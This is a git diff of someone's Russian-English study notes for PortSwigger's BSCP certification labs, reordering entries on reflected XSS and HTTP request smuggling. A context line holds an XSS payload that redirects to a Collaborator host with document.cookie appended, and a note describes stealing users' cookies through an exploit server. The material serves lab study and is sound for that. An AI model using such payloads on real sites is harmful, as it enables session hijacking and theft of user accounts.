@@ -34,6 +34,9 @@ BSCP NOTES PREPAPATION
 
 * **PortSwigger Lab: Password reset poisoning via middleware**
 
+* **PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked**
+  ⚠️ *брут тэгов event и tags. эксплуатация через exploit server*
+
 * **Lab: Exploiting HTTP request smuggling to deliver reflected XSS**
 ```html  
 POST / HTTP/1.1
@@ -76,8 +79,6 @@ x=1
 location="https://TARGET.web-security-academy.net/?find=%22%7D%3Blocation%3D%22https%3A//YOUR-COLLABORATOR.oastify.com/%3F%22%2Bdocument.cookie%3B%2F%2F";
 </script>
 ```
-* ** Lab: Reflected XSS into HTML context with most tags and attributes blocked **
-В этой лабе брутим тэги и эвенты и через exploit сервер пиздим куки юзера
 📌 Используется для:
 
 * кражи cookies
